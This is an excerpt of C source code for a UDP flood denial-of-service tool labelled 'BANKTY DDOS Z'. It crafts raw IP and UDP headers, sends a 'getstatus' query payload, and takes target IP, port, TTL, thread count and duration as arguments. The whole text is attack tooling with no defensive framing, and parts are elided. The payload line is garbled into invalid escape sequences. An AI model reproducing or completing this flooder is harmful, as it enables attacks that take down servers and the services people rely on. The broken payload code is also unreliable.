...
void setup_ip_header(struct iphdr *iph)
{
  ...
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + rand()%255;
...
void setup_udp_header(struct udphdr *udph)
{
  ...
  data = replStr("\rand()%xff\rand()%xff\rand()%xff\rand()%xff\rand()%x67\rand()%x65\rand()%x74\rand()%x73\rand()%x74\rand()%x61\rand()%x74\rand()%x75\rand()%x73\rand()%x0a" ,23);
  udph->len=htons(23);
}
...
{
  if(argc < 5){
    fprintf(stderr, "BANKTY DDOS Z\n");
    fprintf(stdout, "BANKTY DDOS Z\nUsage: %s <IP> <PORT> <TTL> <THREADS> <TIME>\n", argv[0]);
    exit(-1);
  }
